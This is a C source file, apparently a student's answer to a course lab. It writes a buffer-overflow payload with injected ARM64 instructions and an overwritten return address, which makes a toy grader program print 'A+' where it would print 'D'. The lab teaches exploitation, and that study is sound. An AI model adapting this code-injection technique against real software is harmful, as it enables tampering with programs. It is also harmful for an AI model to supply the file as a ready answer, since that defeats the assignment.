/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Maxwell Lin and Melody Choi                                */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/*--------------------------------------------------------------------*/

/* Creates a string capable of causes the grader.c program to generate 
   output whose format is indistinguishable from normal output, with 
   the exception that the grade 'D' is changed to "A+".

   Outputs to file dataAplus (if file does not exist, creates it). 
   Returns 0. */

int main(void)
{
   FILE *psFile;
   unsigned long ulData1;
   unsigned int uiData2;
   unsigned int uiData3;
   unsigned int uiData4;

   ulData1 = 0x420068; /* address to the instructions below */
   uiData2 = 0x52800141; /* "mov w1, #0x0A" in machine language */
   uiData3 = 0x10000040; /* "adr x0, 0x420074" in machine language */
   uiData4 = 0x17FF8201; /* "b 0x400874" in machine language */

   psFile = fopen("dataAplus", "w");

   /* buf[0-15] */
   fprintf(psFile, "Max and Melody");
   putc('\0', psFile);
   putc('\0', psFile);
   /* buf[16-19] */
   fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
   /* buf[20-23] */
   fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
   /* buf[24-27] */
   fwrite(&uiData4, sizeof(unsigned int), 1, psFile);
   /* buf[28-47] */
   fprintf(psFile, "A+ is your grade.");
   putc('%', psFile);
   putc('c', psFile);
   putc('\0', psFile);
   /* buf[48-55] (main return address) */
   fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
   /* buf[56] (newline to end attack) */
   putc('\n', psFile);
   return 0;

   /* The overwritten return value redirects the return of getName
      To the point in bss where injected commands are stored, then:
       
      >runs the command "mov w1 '\n'"
      >runs the command "adr x0, 0x420074"
         the address 0x420074 is a replacement string consisting of
         "A+ is your grade.%c"
      >branches to the code just before the first "bl printf"
       
      
      thus calling printf("A+ is your grade.%c", '\n'). */
}